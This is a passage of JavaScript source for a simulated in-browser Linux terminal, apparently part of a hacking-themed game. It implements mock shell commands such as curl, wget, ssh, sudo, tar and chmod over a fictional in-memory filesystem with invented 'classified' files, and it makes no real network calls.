            const jobNum = args[0].startsWith('%') ? parseInt(args[0].slice(1)) : parseInt(args[0]);
            jobIdx = state.jobs.findIndex(j => j.id === jobNum);
            if (jobIdx === -1) return _err(`fg: %${jobNum}: no such job`);
        }

        const job = state.jobs[jobIdx];
        job.status = 'Running';

        // Actually execute the command now (simulated foreground)
        const { cmd, args: cmdArgs } = _parseCommand(job.cmd);
        const result = _executeCommand(cmd, cmdArgs, job.cmd);

        // Remove from jobs (completed)
        state.jobs.splice(jobIdx, 1);

        // Remove from process table
        delete state.processes[job.pid];

        return `${job.cmd}\n${result || ''}`;
    }

    function _cmd_bg(args) {
        if (state.jobs.length === 0) {
            return _err('bg: no current job');
        }

        // Get job by number or use most recent
        let jobIdx = state.jobs.length - 1;
        if (args[0]) {
            const jobNum = args[0].startsWith('%') ? parseInt(args[0].slice(1)) : parseInt(args[0]);
            jobIdx = state.jobs.findIndex(j => j.id === jobNum);
            if (jobIdx === -1) return _err(`bg: %${jobNum}: no such job`);
        }

        const job = state.jobs[jobIdx];
        job.status = 'Running';

        return `[${job.id}] ${job.cmd} &`;
    }

    function _cmd_wc(args) {
        const files = args.filter(a => !a.startsWith('-'));
        if (files.length === 0) return '<span class="clh-dim">wc: reading from stdin</span>';
        return files.map(f => {
            const path = _resolvePath(f);
            const node = state.fs[path];
            if (!node || !node.content) return '';
            const lines = node.content.split('\n').length;
            const words = node.content.split(/\s+/).filter(w => w).length;
            const bytes = node.content.length;
            return `${lines.toString().padStart(7)} ${words.toString().padStart(7)} ${bytes.toString().padStart(7)} ${f}`;
        }).join('\n');
    }

    function _cmd_sort(args) {
        const file = args.find(a => !a.startsWith('-'));
        if (!file) return '<span class="clh-dim">sort: reading from stdin</span>';
        const path = _resolvePath(file);
        const node = state.fs[path];
        if (!node || !node.content) return _err(`sort: ${file}: No such file`);
        let lines = node.content.split('\n').filter(l => l);
        if (args.includes('-n')) lines.sort((a, b) => parseFloat(a) - parseFloat(b));
        else lines.sort();
        if (args.includes('-r')) lines.reverse();
        return lines.join('\n');
    }

    function _cmd_uniq(args) {
        const file = args.find(a => !a.startsWith('-'));
        if (!file) return '<span class="clh-dim">uniq: reading from stdin</span>';
        const path = _resolvePath(file);
        const node = state.fs[path];
        if (!node || !node.content) return _err(`uniq: ${file}: No such file`);
        const lines = node.content.split('\n');
        const result = [];
        let prev = null;
        for (const line of lines) {
            if (line !== prev) { result.push(line); prev = line; }
        }
        return result.join('\n');
    }

    function _cmd_cut(args) {
        let delimiter = '\t', fields = null, file = null;
        for (let i = 0; i < args.length; i++) {
            if (args[i] === '-d' && args[i + 1]) { delimiter = args[i + 1]; i++; }
            else if (args[i] === '-f' && args[i + 1]) { fields = args[i + 1].split(',').map(f => parseInt(f) - 1); i++; }
            else if (!args[i].startsWith('-')) file = args[i];
        }
        if (!file) return '<span class="clh-dim">cut: reading from stdin</span>';
        if (!fields) return _err('cut: you must specify a list of fields');
        const path = _resolvePath(file);
        const node = state.fs[path];
        if (!node || !node.content) return _err(`cut: ${file}: No such file`);
        return node.content.split('\n').map(line => {
            const parts = line.split(delimiter);
            return fields.map(f => parts[f] || '').join(delimiter);
        }).join('\n');
    }

    function _cmd_tr(args) { return '<span class="clh-dim">tr: character translation - use: tr SET1 SET2</span>'; }

    // ═══════════════════════════════════════════════════════════════
    // BASH/SCRIPT EXECUTION
    // ═══════════════════════════════════════════════════════════════

    function _cmd_bash(args) {
        // No arguments - just show bash info
        if (args.length === 0) {
            return '<span class="clh-dim">GNU bash, version 5.1.16(1)-release\nType \'exit\' to exit the shell.</span>';
        }

        // Handle flags
        const flags = args.filter(a => a.startsWith('-'));
        const scriptPath = args.find(a => !a.startsWith('-'));

        if (!scriptPath) {
            if (flags.includes('-c')) {
                // bash -c "command" - just return simulation notice
                return '<span class="clh-dim">[bash -c execution simulated]</span>';
            }
            return '<span class="clh-dim">bash: no script specified</span>';
        }

        // Resolve script path
        const resolvedPath = _resolvePath(scriptPath);
        const scriptNode = state.fs[resolvedPath];

        if (!scriptNode) {
            return _err(`bash: ${scriptPath}: No such file or directory`);
        }

        if (scriptNode.type === 'dir') {
            return _err(`bash: ${scriptPath}: Is a directory`);
        }

        // Get script content
        const content = scriptNode.content || '';
        const lines = content.split('\n');

        // Build simulated output
        const outputLines = [];
        let lineNumber = 0;

        for (const line of lines) {
            lineNumber++;
            const trimmed = line.trim();

            // Skip empty lines, comments, shebang
            if (!trimmed || trimmed.startsWith('#')) continue;

            // Simulate common commands in scripts
            if (trimmed.startsWith('echo ')) {
                // Handle echo with variable expansion
                let echoArg = trimmed.substring(5).trim();
                // Remove quotes if present
                echoArg = echoArg.replace(/^["']|["']$/g, '');
                // Expand $() command substitution with simulated values
                echoArg = echoArg
                    .replace(/\$\(whoami\)/g, currentUser.username)
                    .replace(/\$\(hostname\)/g, config.hostname)
                    .replace(/\$\(pwd\)/g, state.currentDir)
                    .replace(/\$\(date[^)]*\)/g, new Date().toISOString().slice(0, 19).replace('T', '-'))
                    .replace(/\$USER/g, currentUser.username)
                    .replace(/\$HOME/g, `/home/${currentUser.username}`)
                    .replace(/\$PWD/g, state.currentDir);
                outputLines.push(echoArg);
            }
            else if (trimmed === 'whoami') {
                outputLines.push(currentUser.username);
            }
            else if (trimmed === 'hostname') {
                outputLines.push(config.hostname);
            }
            else if (trimmed === 'pwd') {
                outputLines.push(state.currentDir);
            }
            else if (trimmed.startsWith('date')) {
                outputLines.push(new Date().toString());
            }
            else if (trimmed.startsWith('ls')) {
                // Simple ls simulation
                outputLines.push(_cmd_ls(trimmed.split(' ').slice(1)));
            }
            else if (trimmed.startsWith('cat ')) {
                const catFile = trimmed.substring(4).trim();
                outputLines.push(_cmd_cat([catFile]));
            }
            else if (trimmed.startsWith('mkdir ')) {
                const mkdirResult = _cmd_mkdir(trimmed.split(' ').slice(1));
                if (mkdirResult) outputLines.push(mkdirResult);
            }
            else if (trimmed.startsWith('cp ')) {
                const cpResult = _cmd_cp(trimmed.split(' ').slice(1));
                if (cpResult) outputLines.push(cpResult);
            }
            else if (trimmed.startsWith('ip ') || trimmed === 'ifconfig') {
                outputLines.push(_cmd_ifconfig());
            }
            else {
                // For unrecognized commands, just show them as simulated
                outputLines.push(`<span class="clh-dim">[${trimmed}]</span>`);
            }
        }

        if (outputLines.length === 0) {
            return '<span class="clh-dim">[script executed - no output]</span>';
        }

        return outputLines.join('\n');
    }

    function _cmd_chmod(args) {
        if (args.length < 2) return _err('chmod: missing operand');

        let recursive = false;
        let modeArg = null;
        const files = [];

        for (const arg of args) {
            if (arg === '-R' || arg === '-r') recursive = true;
            else if (!modeArg && /^[0-7]{3,4}$/.test(arg)) modeArg = arg;
            else if (!modeArg && /^[ugoa]*[+-=][rwxXst]+$/.test(arg)) modeArg = arg;
            else if (!arg.startsWith('-')) files.push(arg);
        }

        if (!modeArg) return _err('chmod: invalid mode');
        if (files.length === 0) return _err('chmod: missing file operand');

        for (const f of files) {
            const path = _resolvePath(f);
            const node = state.fs[path];
            if (!node) return _err(`chmod: cannot access '${f}': No such file or directory`);

            // Check if user owns the file or is root
            if (node.owner !== currentUser.username && currentUser.username !== 'root' && !state.isSudoMode) {
                return _err(`chmod: changing permissions of '${f}': Operation not permitted`);
            }

            // Apply numeric mode
            if (/^[0-7]{3,4}$/.test(modeArg)) {
                const mode = modeArg.slice(-3);  // Use last 3 digits
                const isDir = node.type === 'dir';
                node.perms = _numericToPermString(parseInt(mode), isDir);
            } else {
                // Apply symbolic mode (e.g., u+x, g-w, o+r, a+x)
                const perms = _parsePermissions(node.perms);
                const match = modeArg.match(/^([ugoa]*)([+-=])([rwxXst]+)$/);
                if (match) {
                    const [, who, op, what] = match;
                    const targets = who === '' || who === 'a' ? ['owner', 'group', 'other'] :
                        [...(who.includes('u') ? ['owner'] : []),
                         ...(who.includes('g') ? ['group'] : []),
                         ...(who.includes('o') ? ['other'] : [])];

                    for (const t of targets) {
                        if (what.includes('r')) perms[t].r = (op !== '-');
                        if (what.includes('w')) perms[t].w = (op !== '-');
                        if (what.includes('x')) perms[t].x = (op !== '-');
                    }

                    // Rebuild permission string
                    const typeChar = node.type === 'dir' ? 'd' : '-';
                    node.perms = typeChar +
                        (perms.owner.r ? 'r' : '-') + (perms.owner.w ? 'w' : '-') + (perms.owner.x ? 'x' : '-') +
                        (perms.group.r ? 'r' : '-') + (perms.group.w ? 'w' : '-') + (perms.group.x ? 'x' : '-') +
                        (perms.other.r ? 'r' : '-') + (perms.other.w ? 'w' : '-') + (perms.other.x ? 'x' : '-');
                }
            }
        }
        return null;
    }

    function _cmd_chown(args) {
        if (args.length < 2) return _err('chown: missing operand');

        // Only root can chown
        if (currentUser.username !== 'root' && !state.isSudoMode) {
            return _err('chown: changing ownership: Operation not permitted');
        }

        let recursive = false;
        let ownerSpec = null;
        const files = [];

        for (const arg of args) {
            if (arg === '-R' || arg === '-r') recursive = true;
            else if (!ownerSpec && (arg.includes(':') || !arg.startsWith('-'))) {
                if (!ownerSpec && !arg.startsWith('/') && !arg.startsWith('.')) ownerSpec = arg;
                else files.push(arg);
            }
            else if (!arg.startsWith('-')) files.push(arg);
        }

        if (!ownerSpec) return _err('chown: missing owner');
        if (files.length === 0) return _err('chown: missing file operand');

        // Parse owner:group
        const [newOwner, newGroup] = ownerSpec.split(':');

        for (const f of files) {
            const path = _resolvePath(f);
            const node = state.fs[path];
            if (!node) return _err(`chown: cannot access '${f}': No such file or directory`);

            if (newOwner) node.owner = newOwner;
            if (newGroup !== undefined) node.group = newGroup || newOwner;
        }

        return null;
    }

    function _cmd_chgrp(args) {
        if (args.length < 2) return _err('chgrp: missing operand');

        // Only root or group members can chgrp
        if (currentUser.username !== 'root' && !state.isSudoMode) {
            return _err('chgrp: changing group: Operation not permitted');
        }

        const newGroup = args.find(a => !a.startsWith('-') && !a.includes('/'));
        const files = args.filter(a => !a.startsWith('-') && a !== newGroup);

        if (!newGroup) return _err('chgrp: missing group');
        if (files.length === 0) return _err('chgrp: missing file operand');

        for (const f of files) {
            const path = _resolvePath(f);
            const node = state.fs[path];
            if (!node) return _err(`chgrp: cannot access '${f}': No such file or directory`);

            node.group = newGroup;
        }

        return null;
    }

    function _cmd_export(args) {
        if (args.length === 0) return Object.entries(state.env).map(([k, v]) => `declare -x ${k}="${v}"`).join('\n');
        for (const arg of args) {
            if (arg.includes('=')) {
                const [name, ...vals] = arg.split('=');
                state.env[name] = vals.join('=');
            }
        }
        return null;
    }

    function _cmd_help() {
        return `<span class="clh-highlight">═══════════════════════════════════════════════════════════════</span>
<span class="clh-highlight">  CLH Terminal - Command Line Hacker Environment</span>
<span class="clh-highlight">═══════════════════════════════════════════════════════════════</span>

<span class="clh-cmd">Navigation:</span>        cd, pwd, ls
<span class="clh-cmd">File Operations:</span>   cat, head, tail, touch, mkdir, rm, cp, mv
<span class="clh-cmd">Search:</span>            find, grep, which, whereis
<span class="clh-cmd">User Info:</span>         whoami, id, groups, who, w
<span class="clh-cmd">System Info:</span>       uname, hostname, uptime, date, df, du, free
<span class="clh-cmd">Processes:</span>         ps, top, kill, jobs, fg, bg
<span class="clh-cmd">Text Processing:</span>   echo, wc, sort, uniq, cut, grep
<span class="clh-cmd">Permissions:</span>       chmod, chown, sudo, su
<span class="clh-cmd">Network:</span>           ping, ifconfig, netstat, curl, ssh
<span class="clh-cmd">Help:</span>              help, man [command]

<span class="clh-dim">Tips: Tab completion, ↑↓ history, Ctrl+C interrupt, Ctrl+L clear</span>`;
    }

    function _cmd_man(args) {
        if (args.length === 0) return _err('What manual page do you want?');
        // TODO: Expand man pages
        return `<span class="clh-highlight">${args[0].toUpperCase()}(1)</span>\n\nNAME\n       ${args[0]} - command description\n\nSYNOPSIS\n       ${args[0]} [OPTIONS] [ARGUMENTS]\n\n<span class="clh-dim">Use ${args[0]} --help for quick reference</span>`;
    }

    function _cmd_type(args) {
        const builtins = ['cd', 'pwd', 'echo', 'export', 'alias', 'history', 'exit'];
        return args.map(c => builtins.includes(c) ? `${c} is a shell builtin` : `${c} is /usr/bin/${c}`).join('\n');
    }

    function _cmd_ping(args) {
        const host = args.find(a => !a.startsWith('-')) || 'localhost';
        let count = 4;  // Default ping count
        const countIdx = args.indexOf('-c');
        if (countIdx !== -1 && args[countIdx + 1]) {
            count = parseInt(args[countIdx + 1]) || 4;
        }

        // Define known hosts with realistic latencies and IPs
        const knownHosts = {
            'localhost': { ip: '127.0.0.1', latency: [0.05, 0.15], ttl: 64 },
            '127.0.0.1': { ip: '127.0.0.1', latency: [0.05, 0.15], ttl: 64 },
            'gateway.internal': { ip: '10.0.0.1', latency: [1, 5], ttl: 64 },
            'target.internal': { ip: '10.0.0.10', latency: [5, 20], ttl: 63 },
            'archive.internal': { ip: '10.0.0.50', latency: [10, 30], ttl: 62 },
            'google.com': { ip: '142.250.80.46', latency: [15, 45], ttl: 117 },
            '8.8.8.8': { ip: '8.8.8.8', latency: [20, 50], ttl: 118 },
        };

        const hostInfo = knownHosts[host] || { ip: '10.0.0.' + Math.floor(Math.random() * 200 + 50), latency: [30, 100], ttl: 60 };
        const getLatency = () => (Math.random() * (hostInfo.latency[1] - hostInfo.latency[0]) + hostInfo.latency[0]).toFixed(2);

        const results = [`PING ${host} (${hostInfo.ip}) 56(84) bytes of data.`];
        const latencies = [];

        // Simulate occasional packet loss (5% chance)
        let received = 0;
        for (let i = 1; i <= Math.min(count, 5); i++) {  // Cap at 5 for display
            if (Math.random() > 0.05) {
                const lat = parseFloat(getLatency());
                latencies.push(lat);
                results.push(`64 bytes from ${hostInfo.ip}: icmp_seq=${i} ttl=${hostInfo.ttl} time=${lat} ms`);
                received++;
            } else {
                // Packet lost (simulated timeout would be shown)
            }
        }

        const loss = ((count - received) / count * 100).toFixed(0);
        const min = latencies.length ? Math.min(...latencies).toFixed(3) : '0.000';
        const max = latencies.length ? Math.max(...latencies).toFixed(3) : '0.000';
        const avg = latencies.length ? (latencies.reduce((a, b) => a + b, 0) / latencies.length).toFixed(3) : '0.000';

        results.push('');
        results.push(`--- ${host} ping statistics ---`);
        results.push(`${count} packets transmitted, ${received} received, ${loss}% packet loss, time ${count * 1001}ms`);
        results.push(`rtt min/avg/max/mdev = ${min}/${avg}/${max}/0.500 ms`);

        return results.join('\n');
    }

    function _cmd_ifconfig() {
        return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.100  netmask 255.255.255.0  broadcast 10.0.0.255
        inet6 fe80::1  prefixlen 64  scopeid 0x20<link>
        ether 00:11:22:33:44:55  txqueuelen 1000  (Ethernet)
        RX packets 12345  bytes 1234567 (1.2 MB)
        TX packets 12345  bytes 1234567 (1.2 MB)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)`;
    }

    function _cmd_netstat() {
        return `Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 10.0.0.100:22          10.0.0.1:52413          ESTABLISHED
tcp        0      0 10.0.0.100:443         93.184.216.34:https     TIME_WAIT

Active UNIX domain sockets (w/o servers)
Proto RefCnt Type       State         Path
unix  2      DGRAM                    /run/systemd/notify
unix  2      STREAM     CONNECTED     /run/dbus/system_bus_socket`;
    }

    function _cmd_curl(args) {
        const url = args.find(a => !a.startsWith('-') && (a.startsWith('http') || !a.includes('/')));
        if (!url) return _err('curl: no URL specified');

        const outputIdx = args.indexOf('-o');
        const outputFile = outputIdx !== -1 ? args[outputIdx + 1] : null;

        // Simulated response content based on URL
        const hostname = url.replace(/^https?:\/\//, '').split('/')[0];
        const content = `<!DOCTYPE html>
<html>
<head><title>Response from ${hostname}</title></head>
<body>
<h1>Welcome to ${hostname}</h1>
<p>This is a simulated response from the CLH terminal.</p>
<p>Timestamp: ${new Date().toISOString()}</p>
</body>
</html>`;

        // If -o specified, save to file
        if (outputFile) {
            const path = _resolvePath(outputFile);
            const parentPath = path.split('/').slice(0, -1).join('/') || '/';
            const fileName = path.split('/').pop();
            const parent = state.fs[parentPath];

            if (parent && parent.type === 'dir') {
                if (!_canWrite(parent)) {
                    return _err(`curl: cannot write to '${outputFile}': Permission denied`);
                }
                state.fs[path] = {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: currentUser.username,
                    group: currentUser.username,
                    size: content.length,
                    content: content
                };
                if (!parent.children.includes(fileName)) parent.children.push(fileName);
                return `<span class="clh-dim">  % Total    % Received  Time    Current
                                 Dload
100  ${content.length}  100  ${content.length}    0     0   ${Math.floor(content.length / 0.001)}      0 --:--:-- --:--:-- --:--:-- ${Math.floor(content.length / 0.001)}</span>`;
            }
        }

        // Default: output to stdout
        return content;
    }

    function _cmd_wget(args) {
        const url = args.find(a => !a.startsWith('-') && (a.startsWith('http') || !a.includes('/')));
        if (!url) return _err('wget: no URL specified');

        const quiet = args.includes('-q');
        const hostname = url.replace(/^https?:\/\//, '').split('/')[0];
        const urlPath = url.replace(/^https?:\/\/[^/]+/, '') || '/';
        const defaultFilename = urlPath === '/' ? 'index.html' : urlPath.split('/').pop() || 'download';

        // Output filename from -O or default
        const outputIdx = args.indexOf('-O');
        const outputFile = outputIdx !== -1 ? args[outputIdx + 1] : defaultFilename;

        const content = `<!DOCTYPE html>
<html>
<head><title>${hostname}</title></head>
<body>
<h1>Downloaded from ${hostname}</h1>
<p>Path: ${urlPath}</p>
<p>Downloaded: ${new Date().toISOString()}</p>
</body>
</html>`;

        // Save the file
        const path = _resolvePath(outputFile);
        const parentPath = path.split('/').slice(0, -1).join('/') || '/';
        const fileName = path.split('/').pop();
        const parent = state.fs[parentPath];

        if (parent && parent.type === 'dir') {
            if (!_canWrite(parent)) {
                return _err(`wget: cannot write to '${outputFile}': Permission denied`);
            }
            state.fs[path] = {
                type: 'file',
                perms: '-rw-r--r--',
                owner: currentUser.username,
                group: currentUser.username,
                size: content.length,
                content: content
            };
            if (!parent.children.includes(fileName)) parent.children.push(fileName);
        }

        if (quiet) return '';

        return `--${new Date().toISOString().slice(0, 19).replace('T', ' ')}--  ${url}
Resolving ${hostname}... 93.184.216.34
Connecting to ${hostname}|93.184.216.34|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: ${content.length} (${(content.length / 1024).toFixed(1)}K) [text/html]
Saving to: '${outputFile}'

${outputFile.padEnd(20)} 100%[===================>]   ${(content.length / 1024).toFixed(1)}K  --.-KB/s    in 0s

${new Date().toISOString().slice(0, 19).replace('T', ' ')} (${(content.length / 1024 * 100).toFixed(0)} KB/s) - '${outputFile}' saved [${content.length}/${content.length}]`;
    }

    function _cmd_ssh(args) {
        const host = args.find(a => !a.startsWith('-') && !a.includes('@')) || args.find(a => a.includes('@'))?.split('@')[1];
        const userHost = args.find(a => a.includes('@'));
        const remoteUser = userHost ? userHost.split('@')[0] : currentUser.username;

        if (!host) return _err('ssh: missing host');

        // Check if host is known
        const knownHosts = ['target.internal', 'archive.internal', 'gateway.internal', 'localhost'];
        if (!knownHosts.includes(host)) {
            return _err(`ssh: Could not resolve hostname ${host}: Name or service not known`);
        }

        // Store current state before SSH
        state.localState = {
            currentDir: state.currentDir,
            hostname: config.hostname,
            prompt: config.prompt,
            fs: JSON.parse(JSON.stringify(state.fs)),  // Deep copy
        };

        // Switch to remote "host"
        state.remoteHost = host;
        config.hostname = host.split('.')[0];  // Use short hostname

        // Remote filesystems (simplified for simulation)
        const remoteFilesystems = {
            'target.internal': {
                '/home': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['operator', 'admin'] },
                '/home/operator': { type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator', children: ['data', 'logs'] },
                '/home/operator/data': { type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator', children: ['classified.txt', 'intel.db'] },
                '/home/operator/data/classified.txt': { type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 256, content: 'TOP SECRET - TARGET INTERNAL\n\nOperation codename: SHADOW STRIKE\nStatus: Active\nCoordinates: [REDACTED]\n\nThis information is compartmentalized.\n' },
                '/home/operator/data/intel.db': { type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512, content: 'agent_id,status,last_contact\n001,active,2026-01-15\n002,dormant,2025-12-01\n003,compromised,2026-01-10\n' },
                '/home/operator/logs': { type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator', children: ['access.log'] },
                '/home/operator/logs/access.log': { type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256, content: '2026-01-17 09:00:00 - Login successful: operator\n2026-01-17 09:15:00 - File accessed: classified.txt\n2026-01-17 09:30:00 - SSH connection from 10.0.0.100\n' },
            },
            'archive.internal': {
                '/home': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['operator'] },
                '/home/operator': { type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator', children: ['archives', 'backups'] },
                '/home/operator/archives': { type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator', children: ['project-omega.tar.gz', 'manifest.txt'] },
                '/home/operator/archives/manifest.txt': { type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 128, content: 'Archive Manifest\n================\nproject-omega.tar.gz - 2025-12-15 - [ENCRYPTED]\nbackup-2026-01.tar - 2026-01-01\n' },
            },
        };

        // Merge remote filesystem with base
        if (remoteFilesystems[host]) {
            for (const [path, node] of Object.entries(remoteFilesystems[host])) {
                state.fs[path] = node;
            }
        }

        // Reset to home directory
        state.currentDir = '/home/operator';
        state.env.PWD = state.currentDir;
        _updatePrompt();

        return `<span class="clh-dim">The authenticity of host '${host}' can't be established.
ED25519 key fingerprint is SHA256:abcdef1234567890.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '${host}' (ED25519) to the list of known hosts.
${remoteUser}@${host}'s password: ********</span>

<span class="clh-success">Connected to ${host}</span>
<span class="clh-dim">Last login: ${new Date().toString()}</span>`;
    }

    function _cmd_scp(args) {
        if (args.length < 2) return _err('scp: missing operand');

        const src = args[args.length - 2];
        const dst = args[args.length - 1];

        // Check if source or dest is remote (contains :)
        const srcIsRemote = src.includes(':');
        const dstIsRemote = dst.includes(':');

        if (!srcIsRemote && !dstIsRemote) {
            // Local copy - use cp
            return _cmd_cp([src, dst]);
        }

        // Simulated remote copy
        let srcHost, srcPath, dstHost, dstPath;

        if (srcIsRemote) {
            [srcHost, srcPath] = src.split(':');
            dstPath = dst;
        } else {
            srcPath = src;
            [dstHost, dstPath] = dst.split(':');
        }

        const size = Math.floor(Math.random() * 10000) + 1000;

        return `${src.split('/').pop().padEnd(25)} 100% ${size}     ${(size / 1024).toFixed(1)}KB/s   00:00`;
    }

    function _cmd_sudo(args) {
        if (args.length === 0) return _err('usage: sudo <command>');

        // Check if user is in sudo group
        const userGroups = currentUser.groups.map(g => g.name);
        if (!userGroups.includes('sudo') && currentUser.username !== 'root') {
            return _err(`${currentUser.username} is not in the sudoers file. This incident will be reported.`);
        }

        // Show password prompt (simulated - accepts any password or empty)
        _print(`<span class="clh-dim">[sudo] password for ${currentUser.username}: ********</span>`);

        // Enable sudo mode temporarily
        state.isSudoMode = true;

        // Parse and execute the command with elevated privileges
        const cmdLine = args.join(' ');
        const { cmd, args: cmdArgs } = _parseCommand(cmdLine);
        const result = _executeCommand(cmd, cmdArgs, cmdLine);

        // Disable sudo mode after command
        state.isSudoMode = false;

        return result;
    }

    function _cmd_su(args) {
        const targetUser = args[0] || 'root';

        // Show password prompt
        _print('<span class="clh-dim">Password: ********</span>');

        // For simulation, su to root always works if user is in sudo group
        const userGroups = currentUser.groups.map(g => g.name);
        if (targetUser === 'root' && !userGroups.includes('sudo')) {
            return `<span class="clh-error">su: Authentication failure</span>`;
        }

        // Actually switch user context
        if (targetUser === 'root') {
            currentUser.username = 'root';
            currentUser.uid = 0;
            currentUser.gid = 0;
            currentUser.home = '/root';
            currentUser.groups = [{ gid: 0, name: 'root' }];

            // Update environment
            state.env.USER = 'root';
            state.env.HOME = '/root';
            state.env.LOGNAME = 'root';

            // Update prompt
            _updatePrompt();

            return '<span class="clh-success">Switched to root user</span>';
        } else {
            // Check if target user exists in /etc/passwd
            const passwdContent = state.fs['/etc/passwd']?.content || '';
            if (!passwdContent.includes(`${targetUser}:`)) {
                return _err(`su: user ${targetUser} does not exist`);
            }

            return `<span class="clh-dim">su: switching to ${targetUser} (simulated)</span>`;
        }
    }

    function _cmd_tree(args) {
        const startPath = _resolvePath(args.find(a => !a.startsWith('-')) || '.');
        const showHidden = args.includes('-a');
        const lines = [];

        function traverse(path, prefix = '') {
            const node = state.fs[path];
            if (!node || node.type !== 'dir') return;

            let children = [...(node.children || [])];
            if (!showHidden) children = children.filter(c => !c.startsWith('.'));
            children.sort();

            children.forEach((child, idx) => {
                const isLast = idx === children.length - 1;
                const childPath = path === '/' ? `/${child}` : `${path}/${child}`;
                const childNode = state.fs[childPath];
                const connector = isLast ? '└── ' : '├── ';
                const name = childNode?.type === 'dir' ? `<span class="clh-dir">${child}</span>` : child;
                lines.push(prefix + connector + name);

                if (childNode?.type === 'dir') {
                    traverse(childPath, prefix + (isLast ? '    ' : '│   '));
                }
            });
        }

        lines.push(`<span class="clh-dir">${startPath}</span>`);
        traverse(startPath);

        const dirs = Object.values(state.fs).filter(n => n.type === 'dir').length;
        const files = Object.values(state.fs).filter(n => n.type === 'file').length;
        lines.push(`\n${dirs} directories, ${files} files`);

        return lines.join('\n');
    }

    function _cmd_tar(args) {
        const verbose = args.includes('-v');
        const file = args.find(a => a !== '-cvf' && a !== '-xvf' && a !== '-tvf' && a !== '-c' && a !== '-x' && a !== '-t' && a !== '-v' && a !== '-f' && !a.startsWith('-') && a.includes('.tar'));
        const fileIdx = args.indexOf('-f');
        const archiveFile = fileIdx !== -1 ? args[fileIdx + 1] : file;
        const otherFiles = args.filter(a => !a.startsWith('-') && a !== archiveFile);

        // Create archive
        if (args.includes('-c') || args[0]?.includes('c')) {
            if (!archiveFile) return _err('tar: Refusing to write archive to stdout');
            if (otherFiles.length === 0) return _err('tar: Cowardly refusing to create an empty archive');

            // Gather all files to archive
            const archivedFiles = [];
            const archiveContent = [];

            for (const f of otherFiles) {
                const path = _resolvePath(f);
                const node = state.fs[path];
                if (!node) {
                    return _err(`tar: ${f}: Cannot stat: No such file or directory`);
                }
                archivedFiles.push({ path: f, node: JSON.parse(JSON.stringify(node)) });
                archiveContent.push(`${f}|${node.type}|${node.perms}|${node.owner}|${node.group}|${node.content || ''}`);

                // If directory, add children recursively
                if (node.type === 'dir' && node.children) {
                    for (const child of node.children) {
                        const childPath = path + '/' + child;
                        const childNode = state.fs[childPath];
                        if (childNode) {
                            archivedFiles.push({ path: f + '/' + child, node: JSON.parse(JSON.stringify(childNode)) });
                            archiveContent.push(`${f}/${child}|${childNode.type}|${childNode.perms}|${childNode.owner}|${childNode.group}|${childNode.content || ''}`);
                        }
                    }
                }
            }

            // Create tar file in filesystem
            const tarPath = _resolvePath(archiveFile);
            const parentPath = tarPath.split('/').slice(0, -1).join('/') || '/';
            const tarName = tarPath.split('/').pop();
            const parent = state.fs[parentPath];

            if (!parent) return _err(`tar: ${archiveFile}: Cannot open: No such file or directory`);
            if (!_canWrite(parent)) return _err(`tar: ${archiveFile}: Cannot open: Permission denied`);

            state.fs[tarPath] = {
                type: 'file',
                perms: '-rw-r--r--',
                owner: currentUser.username,
                group: currentUser.username,
                size: archiveContent.join('\n').length,
                content: archiveContent.join('\n'),
                isArchive: true,
                archivedFiles: archivedFiles
            };
            if (!parent.children.includes(tarName)) parent.children.push(tarName);

            if (verbose) {
                return archivedFiles.map(f => f.path).join('\n');
            }
            return null;
        }

        // Extract archive
        if (args.includes('-x') || args[0]?.includes('x')) {
            if (!archiveFile) return _err('tar: You must specify the archive filename');

            const tarPath = _resolvePath(archiveFile);
            const tarNode = state.fs[tarPath];

            if (!tarNode) return _err(`tar: ${archiveFile}: Cannot open: No such file or directory`);
            if (!tarNode.isArchive && !tarNode.archivedFiles) {
                return _err(`tar: ${archiveFile}: Not a valid archive`);
            }

            const output = [];
            const files = tarNode.archivedFiles || [];

            for (const f of files) {
                const extractPath = _resolvePath(f.path);
                const parentPath = extractPath.split('/').slice(0, -1).join('/') || '/';
                const fileName = extractPath.split('/').pop();

                // Create parent directories if needed
                let parent = state.fs[parentPath];
                if (!parent) {
                    // Create directory
                    state.fs[parentPath] = { type: 'dir', perms: 'drwxr-xr-x', owner: currentUser.username, group: currentUser.username, children: [] };
                    parent = state.fs[parentPath];
                }

                // Extract file
                state.fs[extractPath] = f.node;
                if (!parent.children.includes(fileName)) parent.children.push(fileName);

                if (verbose) output.push(f.path);
            }

            return verbose ? output.join('\n') : null;
        }

        // List archive contents
        if (args.includes('-t') || args[0]?.includes('t')) {
            if (!archiveFile) return _err('tar: You must specify the archive filename');

            const tarPath = _resolvePath(archiveFile);
            const tarNode = state.fs[tarPath];

            if (!tarNode) return _err(`tar: ${archiveFile}: Cannot open: No such file or directory`);
            if (!tarNode.isArchive && !tarNode.archivedFiles) {
                return _err(`tar: ${archiveFile}: Not a valid archive`);
            }

            return (tarNode.archivedFiles || []).map(f => f.path).join('\n');
        }

        return _err('tar: You must specify one of -c, -t, -x');
    }

    function _cmd_nano(args) {
        const file = args[0];
        if (!file) return _err('nano: missing filename');

        const path = _resolvePath(file);
        let content = '';
        let isNew = false;

        // Check if file exists
        if (state.fs[path]) {
            if (state.fs[path].type === 'dir') {
                return _err(`nano: ${file}: Is a directory`);
            }
            if (!_canRead(state.fs[path])) {
